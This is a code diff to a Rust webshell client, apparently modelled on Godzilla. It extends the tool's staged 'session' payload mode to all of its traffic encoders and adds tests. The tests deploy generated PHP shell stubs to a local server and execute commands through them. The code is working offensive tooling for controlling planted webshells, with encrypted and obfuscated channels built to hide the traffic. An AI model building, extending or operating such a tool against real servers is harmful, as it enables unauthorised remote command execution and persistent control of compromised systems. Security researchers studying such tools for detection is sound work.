@@ -32,6 +32,22 @@ use dosword_sdk::{Protocol, ProtocolError, SessionState};
 
 pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";
 
+/// 编码器是否启用分阶段载荷模式：`"session": true` 或编码器本身为 xor_session。
+fn session_mode_for(protocol_params: &str, encoder: &dyn PayloadEncoder) -> bool {
+    if encoder.id() == "xor_session" {
+        return true;
+    }
+    session_enabled(protocol_params) && encoder.id() != "php_stream"
+}
+
+/// 分阶段载荷（Godzilla session 模式）是否启用：protocol_params 中 `"session": true`。
+fn session_enabled(protocol_params: &str) -> bool {
+    serde_json::from_str::<serde_json::Value>(protocol_params)
+        .ok()
+        .and_then(|value| value.get("session").and_then(|item| item.as_bool()))
+        .unwrap_or(false)
+}
+
 /// 从 `protocol_params`（JSON）解析编码器 id，缺省 base64（兼容旧配置与旧 stub）。
 fn encoder_for(protocol_params: &str) -> &'static dyn PayloadEncoder {
     let encoder_id: Option<String> = serde_json::from_str::<serde_json::Value>(protocol_params)
@@ -69,6 +85,8 @@ pub struct PhpSession {
     pub encoder: &'static dyn PayloadEncoder,
     /// Godzilla 分阶段载荷：处理器代码是否已注入服务端 session。
     pub initialized: std::sync::Mutex<bool>,
+    /// 分阶段载荷模式（protocol_params 中 session: true 且编码器支持）。
+    pub session_mode: bool,
 }
 
 impl SessionState for PhpSession {
@@ -606,13 +624,14 @@ impl Protocol for PhpProtocol {
     ) -> Result<ProbeResult, ProtocolError> {
         // 环境信息探测：不产生任何文件系统副作用
         let encoder = encoder_for(&profile.protocol_params);
-        if encoder.id() == "xor_session" {
+        if session_mode_for(&profile.protocol_params, encoder) {
             let php = PhpSession {
                 endpoint: profile.endpoint.clone(),
                 password: profile.password.clone(),
                 client: build_client(settings),
                 encoder,
                 initialized: std::sync::Mutex::new(false),
+                session_mode: true,
             };
             return self.session_probe(&php, settings);
         }
@@ -676,12 +695,14 @@ impl Protocol for PhpProtocol {
     ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
         // 先探测验证密码与连通性，再建立会话
         let result = self.probe(profile, settings)?;
+        let encoder = encoder_for(&profile.protocol_params);
         let session: Box<dyn SessionState> = Box::new(PhpSession {
             endpoint: profile.endpoint.clone(),
             password: profile.password.clone(),
             client: build_client(settings),
-            encoder: encoder_for(&profile.protocol_params),
+            encoder,
             initialized: std::sync::Mutex::new(false),
+            session_mode: session_mode_for(&profile.protocol_params, encoder),
         });
         Ok((session, result))
     }
@@ -1130,9 +1151,9 @@ fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, Protocol
 // Godzilla 分阶段载荷（xor_session）客户端通道
 // ---------------------------------------------------------------------------
 
-/// 是否启用分阶段载荷协议（xor_session 编码器）。
+/// 是否启用分阶段载荷协议（session 模式：编码器 + protocol_params session: true）。
 fn is_session(php: &PhpSession) -> bool {
-    php.encoder.id() == "xor_session"
+    php.session_mode
 }
 
 /// JSON 字符串值转义。
@@ -1169,15 +1190,9 @@ fn session_post(
             settings.max_file_size_mb
         )));
     }
-    // 响应为 XOR 密文（base64），按密码派生密钥解密
-    let key = dosword_sdk::encoder::md5_hex(&php.password).into_bytes();
-    let raw = B64.decode(&bytes)
-        .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
-    Ok(raw
-        .iter()
-        .enumerate()
-        .map(|(index, byte)| byte ^ key[index % key.len()])
-        .collect())
+    // 响应为编码器密文（base64 文本），按编码器解密
+    let text = String::from_utf8_lossy(&bytes);
+    php.encoder.decode(&text, &php.password)
 }
 
 /// 确保处理器代码已注入服务端 session（幂等：已初始化则跳过）。
@@ -1223,7 +1238,7 @@ fn session_call(
 
     // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
     let start = text.find(&nonce).ok_or_else(|| {
-        ProtocolError::ParseError("响应中未找到协议帧".to_string())
+        ProtocolError::ParseError(format!("响应中未找到协议帧（{text}）"))
     })?;
     let tail = &text[start + nonce.len()..];
     let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
@@ -1636,6 +1651,7 @@ mod tests {
             client: build_client(&settings),
             encoder: &Base64Encoder,
             initialized: std::sync::Mutex::new(false),
+            session_mode: false,
         };
         let conn = DbConnection {
             driver: "mysql".into(),
@@ -1676,6 +1692,7 @@ mod tests {
             client: build_client(&settings),
             encoder: &Base64Encoder,
             initialized: std::sync::Mutex::new(false),
+            session_mode: false,
         };
         let conn = DbConnection {
             driver: "sqlite".into(),
@@ -1712,6 +1729,7 @@ mod tests {
             client: build_client(&settings),
             encoder: &Base64Encoder,
             initialized: std::sync::Mutex::new(false),
+            session_mode: false,
         };
         proto
             .execute_command(&session, "id", &settings)
@@ -1773,7 +1791,7 @@ mod tests {
         ];
         let settings = settings();
         for encoder_id in encoders {
-            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret") else {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false) else {
                 eprintln!("跳过 {encoder_id}：未检测到 php 可执行文件");
                 continue;
             };
@@ -1793,6 +1811,46 @@ mod tests {
     }
 
     #[test]
+    fn real_php_session_variants_round_trip() {
+        // Godzilla 分阶段载荷应用到所有编码器：每个编码器以 session 模式真实往返
+        let encoders = [
+            "xor_base64",
+            "base64",
+            "aes128_ecb",
+            "aes128_cbc",
+            "des",
+            "char",
+            "php_obfuscate",
+            "xor_body",
+            "xor_session",
+        ];
+        let settings = settings();
+        for encoder_id in encoders {
+            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true) else {
+                eprintln!("跳过 {encoder_id} session：未检测到 php");
+                continue;
+            };
+            let mut profile = profile(&url);
+            // xor_session 编码器本身即 session；其余通过 protocol_params 开启
+            if encoder_id == "xor_session" {
+                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
+            } else {
+                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}","session":true}}"#);
+            }
+            let result = (|| -> Result<String, ProtocolError> {
+                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+                let output = PhpProtocol.execute_command(session.as_ref(), "printf sess-ok", &settings)?;
+                Ok(output.stdout)
+            })();
+            let _ = child.kill();
+            let _ = child.wait();
+            let _ = std::fs::remove_dir_all(&dir);
+            let stdout = result.unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
+            assert_eq!(stdout.trim(), "sess-ok", "{encoder_id} session 输出不符");
+        }
+    }
+
+    #[test]
     fn real_php_sqlite_db_round_trip() {
         // 真实闭环：php -S + stub 上通过 pdo_sqlite 执行建表/插入/查询
         let Some((url, dir, mut child)) = spawn_php_server() else {
@@ -1807,6 +1865,7 @@ mod tests {
             client: build_client(&settings),
             encoder: &Base64Encoder,
             initialized: std::sync::Mutex::new(false),
+            session_mode: false,
         };
         let db_path = dir.join("test.sqlite");
         let conn = DbConnection {
@@ -1855,7 +1914,11 @@ mod tests {
     /// 在本机临时目录写入指定编码器生成的 stub 并起 `php -S`，
     /// 返回 (endpoint, 临时目录, 进程)。若无 php 可执行则返回 None（跳过测试）。
     /// body 模式编码器（php_stream）自动加 `allow_url_include=1`。
-    fn spawn_php_server_with(encoder_id: &str, password: &str) -> Option<(String, std::path::PathBuf, std::process::Child)> {
+    fn spawn_php_server_with(
+        encoder_id: &str,
+        password: &str,
+        session: bool,
+    ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
         let php = std::process::Command::new("php").arg("-v").output().ok()?;
         if !php.status.success() {
             return None;
@@ -1864,7 +1927,11 @@ mod tests {
         let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
         std::fs::create_dir_all(&dir).ok()?;
         // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
-        let stub = encoder.stub("php", password).ok()?;
+        let stub = if session {
+            encoder.stub_session("php", password).ok()?
+        } else {
+            encoder.stub("php", password).ok()?
+        };
         std::fs::write(dir.join("shell.php"), stub).ok()?;
         std::fs::create_dir_all(dir.join("www")).ok()?;
         std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;
@@ -1879,7 +1946,7 @@ mod tests {
             // 仅 include 流方案需要 allow_url_include；xor_body 用 file_get_contents 无需
             command.arg("-d").arg("allow_url_include=1");
         }
-        if encoder_id == "xor_session" {
+        if session || encoder_id == "xor_session" {
             // 分阶段载荷依赖 session：显式指定可写目录
             command
                 .arg("-d")
@@ -1908,7 +1975,7 @@ mod tests {
     }
 
     fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
-        spawn_php_server_with("base64", "secret")
+        spawn_php_server_with("base64", "secret", false)
     }
 
     #[test]
